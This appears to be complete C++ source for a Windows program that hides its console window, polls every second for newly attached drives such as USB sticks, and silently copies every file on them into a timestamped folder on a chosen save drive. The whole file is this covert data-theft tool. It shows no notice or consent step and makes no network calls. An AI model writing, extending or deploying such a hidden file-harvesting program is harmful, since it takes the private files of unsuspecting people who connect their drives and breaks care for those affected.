#include <iostream>
#include <stdio.h>
#include <winsock.h>
#include <windows.h>
#include <string.h>
#include <string>
#include <io.h>
#include <sstream>
#include <time.h>
#include <fstream>

using std::cout;
using std::endl;
using std::string;
using std::stringstream;
using std::ifstream;
using std::ofstream;

bool registeredDisk[26];
int fileCnt;
string saveDriveLetter, SaveRoot, files[1000006][2];

void dfsListFolderFiles(string path) {
	_finddata_t file_info;
	string current_path = path + "\\*.*";
	int handle = _findfirst(current_path.c_str(), &file_info);

	if (-1 == handle) {
		cout << "cannot match the path: " << path << endl;
		return;
	}

	do {
		cout << file_info.name << ' ' << file_info.attrib << endl;
		if (file_info.attrib == _A_SUBDIR || file_info.attrib == 18 || file_info.attrib == 22 || file_info.attrib == 20) {
			if (strcmp(file_info.name, "..") != 0 && strcmp(file_info.name, ".") != 0) {
//				cout << (saveDriveLetter + SaveRoot + path.substr(2) + "\\" + file_info.name).data() << endl;
				CreateDirectory((saveDriveLetter + SaveRoot + path.substr(2) + "\\" + file_info.name).data(), NULL);
				dfsListFolderFiles(path + "\\" + file_info.name);
			}

		} else {
//			cout << path + "\\" + file_info.name << endl;
			files[++fileCnt][0] = path + "\\" + file_info.name;
			files[fileCnt][1] = (saveDriveLetter + SaveRoot + path.substr(2) + "\\" + file_info.name);
		}
	} while (!_findnext(handle, &file_info));

	_findclose(handle);
}

bool copyFile(const string& source, const string& destination) {
	ifstream src(source, std::ios::binary);
	ofstream dest(destination, std::ios::binary);

	if (!src || !dest) {
		return false;
	}

	dest << src.rdbuf();

	return true;
}

int main() {
	SetConsoleCP(65001);
	ShowWindow(FindWindow("ConsoleWindowClass", NULL), SW_HIDE);
	ifstream fRoot;
	fRoot.open("SaveDriveLetter.txt", std::ios::in);
	std::getline(fRoot, saveDriveLetter);
	fRoot.close();
	cout << saveDriveLetter << endl;
	for (wchar_t driveLetter = 'A'; driveLetter <= 'Z'; driveLetter++) {
		wchar_t letterTemp[3] = {driveLetter, ':', '\0'};
		UINT driveType = GetDriveTypeW(letterTemp);
		switch (driveType) {
			case DRIVE_NO_ROOT_DIR:
				break;
			default:
				registeredDisk[driveLetter - 'A'] = 1;
				break;
		}
	}
	for (char i = 'A'; i <= 'Z'; i++) {
		cout << i << ' ' << registeredDisk[i - 'A'] << '\n';
	}
	while (1) {
		for (wchar_t driveLetter = 'A'; driveLetter <= 'Z'; driveLetter++) {
			wchar_t letterTemp[3] = {driveLetter, ':', '\0'};
			UINT driveType = GetDriveTypeW(letterTemp);
			switch (driveType) {
				case DRIVE_NO_ROOT_DIR:
					registeredDisk[driveLetter - 'A'] = 0;
					break;
				default:
					if (!registeredDisk[driveLetter - 'A']) {
						registeredDisk[driveLetter - 'A'] = 1;
						stringstream root, saveRoot;
						root << (char) driveLetter << ":";
//					char vn[200];
//					char* root_char = root.str().data();
//					GetVolumeInformation(root_char, vn, 2000, NULL, NULL, NULL, NULL, NULL);
//					cout << vn;
						saveRoot << '[' << time(NULL) << "] from [" << ' ' << "]";
						SaveRoot = saveRoot.str();
						cout << (saveDriveLetter + saveRoot.str()).data();
						fileCnt = 0;
						CreateDirectory((saveDriveLetter + saveRoot.str()).data(), NULL);
						dfsListFolderFiles(root.str());
						ofstream rootFile(SaveRoot + ".txt");
						for (int i = 1; i <= fileCnt; i++) {
							rootFile << files[i][1] << endl;
						}
						rootFile.close();
						for (int i = 1; i <= fileCnt; i++) {
							cout << "from " << files[i][0] << " to " << files[i][1] << endl;
							copyFile(files[i][0], files[i][1]);
						}
					}
					break;
			}
		}
		Sleep(1000);
	}
	return 0;
}
